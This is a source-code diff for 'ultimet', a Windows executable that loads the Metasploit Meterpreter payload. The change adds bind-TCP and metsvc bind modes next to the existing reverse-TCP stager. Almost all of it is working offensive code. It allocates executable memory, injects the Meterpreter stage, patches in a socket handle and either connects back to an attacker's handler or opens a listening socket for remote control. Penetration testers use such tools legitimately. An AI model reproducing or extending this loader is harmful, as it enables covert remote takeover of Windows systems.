@@ -1,4 +1,12 @@
 //بسم الله الرحمن الرحيم
+/*
+	Contributors:
+	- Anwar Mohamed "@anwarelmakrahy" http://spysharksecurity.blogspot.com/
+	  Added support for metsvc_bind_tcp & bind_tcp.
+
+	- YOUR NAME HERE...
+*/
+
 /************************************************
 *					  [ultimet]					*
 *		The Ultimate Meterpreter Executable		*
@@ -49,6 +57,7 @@ int wmain(int argc, wchar_t *argv[])
 	void (*function)() = nullptr;				// The casted-to-be-function after we have everything in place.
 	bool FallbackToStager = false;				// If the stage is not bundled in the exe as a resource, or "-f" is not specified, ultimet falls back to work as a stager: if this is true, metsvc will not be availabe. 
 	bool metsvc = false;						// Is metsvc chosen as the transport? this will only work if we have the stage upfront, otherwise it will fail.
+	bool bBind = false;							// Are we bind payload?.
 	int err = 0;								// Errors
 
 	//If "-f" is specified (load stage from local file)
@@ -87,18 +96,16 @@ int wmain(int argc, wchar_t *argv[])
 				{
 					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_HTTPS";
 				}
-
-				/* starting bind tcp */
 				else if (wcscmp(payload_settings.TRANSPORT,L"BIND_TCP") == 0)
 				{
-					payload_settings.TRANSPORT = L"METERPRETER_BIND_TCP";
+					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
+					bBind = true;
 				}
-
-				/* metsvc_bind_tcp */
 				else if (wcscmp(payload_settings.TRANSPORT,L"BIND_METSVC") == 0)
 				{
-					payload_settings.TRANSPORT = L"METERPRETER_BIND_TCP";
+					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
 					metsvc = true;
+					bBind = true;
 				}
 
 				else {
@@ -204,16 +211,13 @@ int wmain(int argc, wchar_t *argv[])
 		//--------- Start of "working as a stager" ------------//
 	{
 
-		if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_SSL") == 0)
+		if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_SSL") == 0) //bind_tcp & reverse_tcp have same transport.
 		{
-			StagerRevereTCP(payload_settings.LHOST,payload_settings.LPORT);
+			if(bBind)		/* bind_tcp */
+				StagerBindTCP(payload_settings.LHOST,payload_settings.LPORT);
+			else
+				StagerRevereTCP(payload_settings.LHOST,payload_settings.LPORT);
 		} 
-
-		/* bind_tcp and bind_metsvc */
-		else if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_BIND_TCP") == 0)
-		{
-			StagerBindTCP(payload_settings.LHOST,payload_settings.LPORT);
-		}  
 
 		else
 		{
@@ -327,7 +331,7 @@ int wmain(int argc, wchar_t *argv[])
 		*	Preparing connection...
 		*/
 		// Are we reverse_metsvc?
-		if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_SSL") == 0)
+		if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_SSL") == 0 && !bBind) //Transport SSL, but not bind.
 		{
 			if(!metsvc) //Are we METERPRETER_TRANSPORT_SSL but not metsvc? note that reverse_tcp AND reverse_metsvc use the same transport, it's the exploit/multi/handler that will make the difference.
 			{
@@ -345,6 +349,7 @@ int wmain(int argc, wchar_t *argv[])
 				StagerRevereTCP(payload_settings.LHOST,payload_settings.LPORT);
 				// see you on the other side :)
 			} 
+
 			// we are METERPRETER_TRANSPORT_SSL, we have the stage, and metsvc is true :)
 
 			// Adjusting buffer .. this is important!
@@ -358,6 +363,37 @@ int wmain(int argc, wchar_t *argv[])
 
 			if (metsvc) dprintf(L"\n[*] Make sure you have \"windows/metsvc_reverse_tcp\" handler running.\n\n");
 			ConnectSocket = get_socket(payload_settings.LHOST,payload_settings.LPORT);
+			if (ConnectSocket == INVALID_SOCKET)
+			{
+				dprintf(L"[-] Failed to connect ... will exit!\n");
+				exit(1);
+			}
+			dprintf(L"[*] Setting EDI-to-be value:  0x%08x -> 0xBF\n", &buffer);
+			buffer[0] = 0xBF;
+			dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
+			memcpy(buffer+1, &ConnectSocket, 4);
+		} 
+		
+				// Are we bind??
+		else if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_SSL") == 0 && bBind) // I know we could've merged this with the previous code block, but that's clearer.
+		{
+			if(!metsvc)
+			{
+				dprintf(L"\n[!] We already have the stage, why did you chose bind_tcp? you could've picked bind_metsvc.\n" 
+						L"    next time use \"-t bind_metsvc\" -> \"exploit/multi/handler/windows/metsvc_bind_tcp\".\n"
+						L" -  anyway, will assume you know what you're doing and connect to bind_tcp in *stager* mode...\n\n");
+					
+				dprintf(L"[*] Make sure you have \"windows/meterpreter_bind_tcp\" handler running.\n\n");
+
+				StagerBindTCP(payload_settings.LHOST,payload_settings.LPORT);
+			} 
+			
+			TempBuffer = (unsigned char*)VirtualAlloc(0, StageSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+			memcpy(TempBuffer + 5, buffer, StageSize);
+			buffer = TempBuffer;
+
+			if (metsvc) dprintf(L"\n[*] Make sure you have \"windows/metsvc_bind_tcp\" handler running.\n\n");
+			ConnectSocket = get_server_socket(payload_settings.LHOST,payload_settings.LPORT);
 			if (ConnectSocket == INVALID_SOCKET)
 			{
 				dprintf(L"[-] Failed to connect ... will exit!\n");
@@ -431,36 +467,6 @@ int wmain(int argc, wchar_t *argv[])
 			dprintf(L"[*] Patching global_meterpreter_url: Offset 0x%08x ->  \"%s\"\n", index, temp );
 			memcpy(&buffer[index], &url, strlen(url)+1); //+1 to make sure it'll be null terminated, otherwise it will end with 'X'
 		}
-
-		else if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_BIND_TCP") == 0)
-		{
-			if(!metsvc)
-			{
-				dprintf(L"\n[!] We already have the stage, why did you chose bind_tcp? you could've picked bind_metsvc.\n" 
-						L"    next time use \"-t bind_metsvc\" -> \"exploit/multi/handler/windows/metsvc_bind_tcp\".\n"
-						L" -  anyway, will assume you know what you're doing and connect to bind_tcp in *stager* mode...\n\n");
-					
-				dprintf(L"[*] Make sure you have \"windows/meterpreter_bind_tcp\" handler running.\n\n");
-
-				StagerBindTCP(payload_settings.LHOST,payload_settings.LPORT);
-			} 
-			
-			TempBuffer = (unsigned char*)VirtualAlloc(0, StageSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-			memcpy(TempBuffer + 5, buffer, StageSize);
-			buffer = TempBuffer;
-
-			if (metsvc) dprintf(L"\n[*] Make sure you have \"windows/metsvc_bind_tcp\" handler running.\n\n");
-			ConnectSocket = get_server_socket(payload_settings.LHOST,payload_settings.LPORT);
-			if (ConnectSocket == INVALID_SOCKET)
-			{
-				dprintf(L"[-] Failed to connect ... will exit!\n");
-				exit(1);
-			}
-			dprintf(L"[*] Setting EDI-to-be value:  0x%08x -> 0xBF\n", &buffer);
-			buffer[0] = 0xBF;
-			dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
-			memcpy(buffer+1, &ConnectSocket, 4);
-		} 
 
 	}
 
